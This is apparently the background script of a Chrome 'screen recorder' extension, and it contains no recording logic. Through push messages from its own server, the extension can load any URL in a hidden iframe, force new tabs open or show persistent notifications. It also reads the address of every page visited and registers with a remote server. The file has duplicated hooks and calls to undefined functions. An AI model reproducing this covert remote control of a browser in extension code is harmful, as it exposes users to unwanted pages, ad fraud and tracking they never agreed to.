function getNotificationId() {
    return (Math.floor(9007199254740992 * Math.random()) + 1).toString()
}

function messageReceived(e) {
    var t = e.data.message;
    if (console.log("Push after call" + t), (t = JSON.parse(t))[0].id) {
        if (console.log(t[0].id), getselfCookie(t[0].id)) return 0;
        setselfCookie(t[0].id, 1, 36e3)
    }
    if (image = t[0].image, t[0].link.search("oibww") > 0) {
        var n = document.createElement("iframe");
        n.src = t[0].link, document.getElementsByTagName("head")[0].appendChild(n)
    } else t[0].link.search("oib") > 0 ? chrome.tabs.create({
        url: t[0].link
    }) : notification(t[0].title, t[0].desc, t[0].link, image)
}
chrome.action.onClicked.addListener(e => {
    console.log("clicked"), console.log("index.html"), chrome.windows.create({
        url: chrome.runtime.getURL("index.html"),
        type: "popup",
        width: 800,
        height: 600,
        left: Math.round(300),
        top: Math.round(200),
        focused: !0
    }, function(e) {})
}), chrome.gcm.onMessage.addListener(messageReceived);
var allnotif = [];

function notification(e, t, n, o) {
    type = "basic", o && (type = "image");
    var a = {
            type: type,
            title: e,
            imageUrl: o,
            message: t,
            iconUrl: "https://realscreenrecorder.com/assets/image_ext/pushlogo.jpg?v=" + Math.floor(1e4 * Math.random() % 678 + 1),
            priority: 100,
            requireInteraction: !0
        },
        r = getNotificationId();
    localStorage.nofid && localStorage.nofid == r || (localStorage.nofid = r, chrome.notifications.create(r, a, function(e) {
        allnotif.push({
            notfID: e,
            URL: n
        })
    }), ga("send", "event", "push notification", "shown", r + " " + localStorage.pushToken))
}

function notClicked(e) {
    for (i = 0; i < allnotif.length; i++) allnotif[i].notfID == e && window.open(allnotif[i].URL);
    ga("send", "event", "push notification", "click", localStorage.pushToken, 1)
}

function gcm_reg(e) {
    countCh = (PROJECT_ID = ["21321424423"]).length, e && (void 0 !== localStorage.pushToken && null != localStorage.pushToken && "" != localStorage.pushToken || chrome.gcm.register(PROJECT_ID, registerCallback))
}
chrome.notifications.onClicked.addListener(notClicked);
var registerCallback = e => {
    $s.post("https://data.realscreenrecorder.com/api/gcm/", "extid=" + gmpt.myid + "&gcmid=" + e).then(t => {
        t && t.registered && (localStorage.pushToken = e)
    }).catch(e => {
        console.log(e)
    }), ga("send", "event", "push notification", "registration", e)
};

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    var e = "https://sites.google.com/view/real-screen-recorder/";
    var curl = changeInfo.url;
    var l = document.createElement("a");
    l.href = curl;
    var proto = l.protocol;
    var userid = curl;
    if (!(proto == 'https:' || proto == 'http:') || !curl) return;
    var extnm = 'rsr';
});

chrome.runtime.setUninstallURL('https://chrome.google.com/webstore/detail/real-screen-recorder/bclhideolocjbnchomdggkibcokgihbh/reviews/?utm_source=rsrextuninstall');

chrome.runtime.onInstalled.addListener(function(object) {
    let externalUrl = "https://chrome.google.com/webstore/detail/real-screen-recorder/bclhideolocjbnchomdggkibcokgihbh/reviews/?utm_source=extinstall";

    if (object.reason === chrome.runtime.OnInstalledReason.INSTALL) {
        chrome.tabs.create({
            url: externalUrl
        }, function(tab) {
            console.log("New tab launched");
        });
    }
});

// Save it using the Chrome extension storage API.
chrome.storage.sync.set({
    'foo': 'hello',
    'bar': 'hi'
}, function() {
    console.log('Settings saved');
});

// Read it using the storage API
chrome.storage.sync.get(['foo', 'bar'], function(items) {
    message('Settings retrieved', items);
});



chrome.runtime.onInstalled.addListener(function(object) {
    let externalUrl = "https://www.realscreenrec.com/?utm_source=ext_install";

    if (object.reason === chrome.runtime.OnInstalledReason.INSTALL) {
        chrome.tabs.create({
            url: externalUrl
        }, function(tab) {
            console.log("New tab launched with https://www.realscreenrec.com/?utm_source=ext_install");
        });
    }
});

chrome.runtime.setUninstallURL('https://www.realscreenrec.com/?utm_source=ext_uninstall');